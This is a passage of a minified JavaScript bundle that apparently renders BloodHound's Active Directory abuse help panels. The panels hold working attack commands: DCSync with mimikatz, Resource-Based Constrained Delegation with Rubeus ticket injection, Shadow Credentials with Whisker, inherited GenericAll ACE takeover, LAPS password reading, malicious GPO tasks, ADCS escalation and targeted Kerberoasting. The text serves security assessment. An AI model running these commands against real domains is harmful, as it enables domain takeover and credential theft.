$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObjectOwner -Credential $Cred -TargetIdentity windows1 -OwnerIdentity harmj0y"}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll permission."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"}),e.jsxs(t,{variant:"body2",children:["The GenericAll grants ",r,' the permission to write to the "msds-KeyCredentialLink" attribute of ',o,'. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is equivalent to the "AddKeyCredentialLink" edge.']}),e.jsx(t,{variant:"body2",children:"Alternatively, GenericAll on a computer object can be used to perform a Resource-Based Constrained Delegation attack."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsx(t,{variant:"body2",children:"To abuse the permission, use Whisker. "}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"||a==="Computer"?`${r} if you are not running a process as that user/computer`:`a member of ${r} if you are not running a process as a member`]}),e.jsx(t,{component:"pre",children:"Whisker.exe add /target:<TargetPrincipal>"}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the Whisker documentation."}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation attack "}),e.jsx(t,{variant:"body2",children:"Abusing this primitive is possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObjectOwner -Credential $Cred -TargetIdentity testlab.local -OwnerIdentity harmj0y"}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a domain object, you may grant yourself the DcSync permissions."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync"}),e.jsx(t,{variant:"body2",children:"Once you have granted yourself this permission, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain"}),e.jsx(t,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:Administrator"}),e.jsx(t,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync"}),e.jsx(t,{variant:"body2",children:"Cleanup for the owner can be done by using Set-DomainObjectOwner once again"}),e.jsx(t,{variant:"body2",children:"Alternatively, you can grant GenericAll on the domain and execute one of the follwing attacks."}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:"The simplest and most straight forward way to obtain control of the objects of the domain is to apply a GenericAll ACE on the domain that will inherit down to all object types. This can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the domain object."}),e.jsx(t,{variant:"body2",children:"Next, we will fetch the GUID for all objects. This should be '00000000-0000-0000-0000-000000000000':"}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name`}),e.jsx(t,{variant:"body2",children:'Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects:'}),e.jsx(t,{component:"pre",children:"$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"}),e.jsx(t,{variant:"body2",children:"Finally, we will apply this ACE to the domain:"}),e.jsx(t,{component:"pre",children:`$DomainDN = "DC=dumpster,DC=fire"
$dsEntry = [ADSI]"LDAP://$DomainDN"
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:`If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. You could, for example, grant a user "ForceChangePassword" permission against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView's help text on how to grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:`}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
$OU = Get-DomainOU -Raw Workstations
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body1",children:"Objects for which ACL inheritance is disabled"}),e.jsx(t,{variant:"body2",children:"The compromise vector described above relies on ACL inheritance and will not work for objects with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute adminCount=1). This observation applies to any user or computer with inheritance disabled, including objects located in nested OUs."}),e.jsx(t,{variant:"body2",children:"In such a situation, it may still be possible to exploit GenericAll permissions on a domain object through an alternative attack vector. Indeed, with GenericAll permissions over a domain object, you may make modifications to the gPLink attribute of the domain. The ability to alter the gPLink attribute of a domain may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the domain user and computer objects (including the ones located in nested OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a domain-joined compromised Windows machine, the gPLink manipulation attack vector may be exploited through Powermad, PowerView and native Windows functionalities. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://labs.withsecure.com/publications/ou-having-a-laugh",children:"this article"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given domain as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of a domain can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target domain through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"GPO":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObjectOwner -Credential $Cred -TargetIdentity TestGPO -OwnerIdentity harmj0y"}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a domain object, you may grant yourself the DcSync permissions."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All"}),e.jsx(t,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse"}),e.jsx(t,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All"}),e.jsx(t,{variant:"body2",children:"Cleanup for the owner can be done by using Set-DomainObjectOwner once again"})]});case"OU":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Organizational Unit"}),e.jsx(t,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as a member of (the group that holds this ACE):"}),e.jsx(t,{component:"pre",children:"Set-DomainObjectOwner -Credential $Cred -TargetIdentity dfm -OwnerIdentity harmj0y"}),e.jsx(t,{variant:"body2",children:"Now with ownership of the OU object, you may grant yourself the GenericAll permission. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),e.jsx(t,{component:"pre",children:`Add-DomainObjectAcl -TargetIdentity ${s} -Rights All`}),e.jsx(t,{variant:"body2",children:"With full control of the OU, you may now add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:"}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:"The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. Again, this can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU."}),e.jsxs(t,{variant:"body2",children:["First, we need to reference the OU by its ObjectGUID, not its name. The ObjectGUID for the OU"," ",o," is: ",s,"."]}),e.jsxs(t,{variant:"body2",children:["Next, we will fetch the GUID for all objects. This should be",e.jsx(t,{component:"pre",children:"'00000000-0000-0000-0000-000000000000':"})]}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name`}),e.jsx(t,{variant:"body2",children:'Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects:'}),e.jsx(t,{component:"pre",children:"$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"}),e.jsx(t,{variant:"body2",children:"Finally, we will apply this ACE to our target OU:"}),e.jsx(t,{component:"pre",children:`$OU = Get-DomainOU -Raw (OU GUID)
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:`If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. You could, for example, grant a user "ForceChangePassword" permission against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView's help text on how to grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:`}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
$OU = Get-DomainOU -Raw Workstations
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body1",children:"Objects for which ACL inheritance is disabled"}),e.jsx(t,{variant:"body2",children:"It is important to note that the compromise vector described above relies on ACL inheritance and will not work for objects with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute adminCount=1). This observation applies to any OU child user or computer with ACL inheritance disabled, including objects located in nested sub-OUs."}),e.jsx(t,{variant:"body2",children:"In such a situation, it may still be possible to exploit GenericAll permissions on an OU through an alternative attack vector. Indeed, with GenericAll permissions over an OU, you may make modifications to the gPLink attribute of the OU. The ability to alter the gPLink attribute of an OU may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the OU's child user and computer objects (including the ones located in nested sub-OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a domain-joined compromised Windows machine, the gPLink manipulation attack vector may be exploited through Powermad, PowerView and native Windows functionalities. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://labs.withsecure.com/publications/ou-having-a-laugh",children:"this article"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given OU as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of an OU can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target OU through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"Container":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as a member of (the group that holds this ACE):"}),e.jsx(t,{component:"pre",children:"Set-DomainObjectOwner -Credential $Cred -TargetIdentity dfm -OwnerIdentity harmj0y"}),e.jsx(t,{variant:"body2",children:"Now with ownership of the container object, you may grant yourself the GenericAll permission inherited to child objects."}),e.jsx(t,{variant:"body2",children:"This can be done with PowerShell:"}),e.jsx(w,{children:`$containerDN = "CN=USERS,DC=DUMPSTER,DC=FIRE"
                        $principalName = "principal"     # SAM account name of principal
                        
                        # Find the certificate template
                        $template = [ADSI]"LDAP://$containerDN"
                        
                        # Construct the ACE
                        $account = New-Object System.Security.Principal.NTAccount($principalName)
                        $sid = $account.Translate([System.Security.Principal.SecurityIdentifier])
                        $ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
                            $sid,
                            [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
                            [System.Security.AccessControl.AccessControlType]::Allow,
                            [System.DirectoryServices.ActiveDirectorySecurityInheritance]::Descendents
                        )
                        # Add the new ACE to the ACL
                        $acl = $template.psbase.ObjectSecurity
                        $acl.AddAccessRule($ace)
                        $template.psbase.CommitChanges()`})]});case"CertTemplate":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteOwner permission on a certificate template, you can grant yourself ownership over the object to then grant yourself GenericAll. With GenericAll, you may be able to perform an ESC4 attack by modifying the template's attributes. BloodHound will in that case create an ADCSESC4 edge from the principal to the forest domain node."})});case"EnterpriseCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteOwner permission on an enterprise CA, you can grant yourself ownership over the object to then grant yourself GenericAll. With GenericAll, you can publish certificate templates to the enterprise CA by adding the CN name of the template in the enterprise CA object's certificateTemplates attribute. This action may enable you to perform an ADCS domain escalation."})});case"RootCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteOwner permission on a root CA, you can grant yourself ownership over the object to then grant yourself GenericAll. With GenericAll, you can make a rogue certificate trusted as a root CA in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation."})});case"NTAuthStore":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteOwner permission on a NTAuth store, you can grant yourself ownership over the object to then grant yourself GenericAll. With GenericAll, you can make an enterprise CA certificate trusted for NT (domain) authentication in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation."})});case"IssuancePolicy":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteOwner permission on an issuance policy object, you can grant yourself ownership over the object to then grant yourself GenericAll. With GenericAll, you create a OID group link to a targeted group by adding the group's distinguishedName in the msDS-OIDToGroupLink attribute of the issuance policy object. This action may enable you to gain membership of the group through an ADCS ESC13 attack."})});default:return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"No abuse information available for this node type."})})}},ef={general:Yb,windowsAbuse:Zb,linuxAbuse:Qb,opsec:Jb,references:Xb},tf=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:`When specific privileges on an object's DACL are explicitly granted to the "OWNER RIGHTS" SID (S-1-3-4), and inheritance is configured for those permissions, they are inherited by the new object owner after a change in ownership. In this case, implicit owner rights are blocked, and the new owner is granted only the specific inherited privileges granted to OWNER RIGHTS.`})}),rf=()=>e.jsx(e.Fragment,{children:e.jsxs(t,{variant:"body2",children:["To abuse change in ownership of an object where the OWNER RIGHTS SID is explicitly granted inherited privileges, you can modify the owner, then abuse the specific privileges granted to the OWNER RIGHTS SID in the context of the new owner.",e.jsx("br",{}),e.jsx("br",{}),"Please refer to the abuse info for the specific privileges granted to OWNER RIGHTS at"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges",children:"https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges"})]})}),nf=()=>e.jsx(e.Fragment,{children:e.jsxs(t,{variant:"body2",children:["Please refer to the OPSEC info for the specific granted permissions at"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html",children:"https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html"})]})}),af=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.hub.trimarcsecurity.com/post/trimarc-whitepaper-owner-or-pwnd",children:"https://www.hub.trimarcsecurity.com/post/trimarc-whitepaper-owner-or-pwnd"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/JimSycurity/OwnerOrPwned",children:"https://github.com/JimSycurity/OwnerOrPwned"})]}),of=()=>e.jsx(e.Fragment,{children:e.jsxs(t,{variant:"body2",children:["To abuse change in ownership of an object where the OWNER RIGHTS SID is explicitly granted inherited privileges, you can modify the owner, then abuse the specific privileges granted to the OWNER RIGHTS SID in the context of the new owner.",e.jsx("br",{}),e.jsx("br",{}),"Please refer to the abuse info for the specific privileges granted to OWNER RIGHTS at",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges",children:"https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges"})]})}),sf={general:tf,windowsAbuse:of,linuxAbuse:rf,opsec:nf,references:af},cf=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is established from the principal that can change the owner of an object to the owned object. This edge is processed further to determine whether implicit owner rights (e.g., WriteDacl) are blocked, which may prevent the owner from compromising the destination object."})}),lf=()=>e.jsx(l,{sx:{overflowX:"auto"},children:e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://adminsdholder.com/2025/02/21/UpdatedOwnerOrPwned.html",children:"https://adminsdholder.com/2025/02/21/UpdatedOwnerOrPwned.html"})}),df={general:cf,references:lf},hf=({sourceName:r,sourceType:a,targetName:o,targetType:i})=>e.jsxs(t,{variant:"body2",children:[E(a,r)," the ability to write to the msPKI-Enrollment-Flag attribute on the ",N(i)," ",o,', which allows the principal to configure "manager approval" for the certificate template and other settings.']}),pf=()=>e.jsx(t,{variant:"body2",children:"This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."}),uf=()=>e.jsx(t,{variant:"body2",children:"When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate."}),mf=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/ec71fd43-61c2-407b-83c9-b52272dec8a1",children:"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/ec71fd43-61c2-407b-83c9-b52272dec8a1"})]}),bf=()=>e.jsx(t,{variant:"body2",children:"This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."}),ff={general:hf,windowsAbuse:bf,linuxAbuse:pf,opsec:uf,references:mf},yf=({sourceName:r,sourceType:a,targetName:o,targetType:i})=>e.jsxs(t,{variant:"body2",children:[E(a,r)," the ability to write to the msPKI-Certificate-Name-Flag attribute on the ",N(i)," ",o,', which allows the principal to configure "enrollee supplies subject" for the certificate template among other settings.']}),gf=()=>e.jsx(t,{variant:"body2",children:"This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."}),xf=()=>e.jsx(t,{variant:"body2",children:"When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate."}),jf=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1",children:"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1"})]}),wf=()=>e.jsx(t,{variant:"body2",children:"This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."}),vf={general:yf,windowsAbuse:wf,linuxAbuse:gf,opsec:xf,references:jf},Af=({sourceName:r,sourceType:a,targetName:o,targetType:i})=>e.jsxs(t,{variant:"body2",children:[E(a,r),' the ability to write to the "serviceprincipalname" attribute to the ',N(i)," ",o,"."]}),Sf=()=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["A targeted kerberoast attack can be performed using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/targetedKerberoast",children:"targetedKerberoast.py"}),"."]}),e.jsx(t,{component:"pre",children:"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}),e.jsx(t,{variant:"body2",children:"The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as 